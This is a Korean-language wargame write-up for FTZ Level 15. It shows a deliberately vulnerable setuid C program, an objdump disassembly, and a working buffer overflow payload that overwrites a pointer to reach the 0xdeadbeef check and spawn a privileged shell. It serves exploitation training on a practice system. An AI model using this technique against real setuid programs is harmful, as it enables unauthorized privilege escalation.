---
sort: 15
---

# Level 15

```note
id : level15

password : guess what
```

hint를 보면 attackme의 소스코드가 나온다.<br>
attackme에 setuid가 걸려있으니 얘를 조져보자.

```c
#include <stdio.h>
 
main()
{ int crap;
  int *check;
  char buf[20];
  fgets(buf,45,stdin);
  if (*check==0xdeadbeef)
   {
     setreuid(3096,3096);
     system("/bin/sh");
   }
}
```

level14에서는 바로 값을 0xdeadbeef로 바꾸면 되었지만 level15에서는 0xdeadbeef가 위치한 주소값을 넣어야 한다.<br>
소스코드를 보면 `*check==0xdeadbeef`부분에 0xdeadbeef가 존재할 것으로 여겨진다.<br>
objdump를 이용하여 disassemble하면 기계어와 어셈블리어를 같이 보여준다.

<pre>
[level15@ftz level15]$ objdump -d ./attackme

08048490 <main>:
 8048490:	55                   	push   %ebp
 8048491:	89 e5                	mov    %esp,%ebp
 8048493:	83 ec 38             	sub    $0x38,%esp
 8048496:	83 ec 04             	sub    $0x4,%esp
 8048499:	ff 35 64 96 04 08    	pushl  0x8049664
 804849f:	6a 2d                	push   $0x2d
 <b>80484a1:	8d 45 c8             	lea    0xffffffc8(%ebp),%eax </b>
 80484a4:	50                   	push   %eax
 80484a5:	e8 b6 fe ff ff       	call   8048360 (_init+0x58)
 80484aa:	83 c4 10             	add    $0x10,%esp
 <b>80484ad:	8b 45 f0             	mov    0xfffffff0(%ebp),%eax </b>

 <b>80484b0:	81 38 ef be ad de    	cmpl   $0xdeadbeef,(%eax) </b>

 80484b6:	75 25                	jne    80484dd (main+0x4d)
 80484b8:	83 ec 08             	sub    $0x8,%esp
 80484bb:	68 18 0c 00 00       	push   $0xc18
 80484c0:	68 18 0c 00 00       	push   $0xc18
 80484c5:	e8 b6 fe ff ff       	call   8048380 (_init+0x78)
 80484ca:	83 c4 10             	add    $0x10,%esp
 80484cd:	83 ec 0c             	sub    $0xc,%esp
 80484d0:	68 48 85 04 08       	push   $0x8048548
 80484d5:	e8 66 fe ff ff       	call   8048340 (_init+0x38)
 80484da:	83 c4 10             	add    $0x10,%esp
 80484dd:	c9                   	leave  
 80484de:	c3                   	ret
</pre>

0x80484b2에 0xdeadbeef값이 존재하는 것을 확인할 수 있었다. 따라서 check에 0x80484b2를 넣으면 된다.

```bash
# padding 0x28 byte + 0x80484b2
[level15@ftz level15]$ (python -c "print('A'*0x28+'\xb2\x84\x04\x08\n')";cat) | ./attackme 
my-pass
```

```tip
## 알게 된 점

buffer overflow
```